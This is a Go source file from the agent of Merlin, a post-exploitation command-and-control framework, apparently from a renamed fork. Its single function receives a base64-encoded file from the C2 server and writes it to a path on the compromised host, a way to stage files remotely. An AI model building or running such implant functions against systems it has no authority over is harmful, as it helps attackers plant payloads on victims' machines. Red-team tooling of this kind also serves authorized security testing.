// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2022  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package commands

import (
	// Standard
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"

	// Merlin Main
	"github.com/testtoto1337/merzhin/pkg/jobs"

	// Internal
	"github.com/testtoto1337/merzhin-agent/cli"
)

// Download receives a job from the server to download a file to host where the Agent is running
func Download(transfer jobs.FileTransfer) (result jobs.Results) {
	cli.Message(cli.DEBUG, "Entering into commands.Download() function")

	// Agent will be downloading a file from the server
	cli.Message(cli.NOTE, "FileTransfer type: Download")

	// Setup OS environment, if any
	err := Setup()
	if err != nil {
		result.Stderr = err.Error()
		return
	}
	defer TearDown()

	_, directoryPathErr := os.Stat(filepath.Dir(transfer.FileLocation))
	if directoryPathErr != nil {
		result.Stderr = fmt.Sprintf("There was an error getting the FileInfo structure for the remote "+
			"directory %s:\r\n", transfer.FileLocation)
		result.Stderr += directoryPathErr.Error()
	}
	if result.Stderr == "" {
		cli.Message(cli.NOTE, fmt.Sprintf("Writing file to %s", transfer.FileLocation))
		downloadFile, downloadFileErr := base64.StdEncoding.DecodeString(transfer.FileBlob)
		if downloadFileErr != nil {
			result.Stderr = downloadFileErr.Error()
		} else {
			errF := ioutil.WriteFile(transfer.FileLocation, downloadFile, 0600)
			if errF != nil {
				result.Stderr = errF.Error()
			} else {
				result.Stdout = fmt.Sprintf("Successfully uploaded file to %s", transfer.FileLocation)
			}
		}
	}
	return result
}
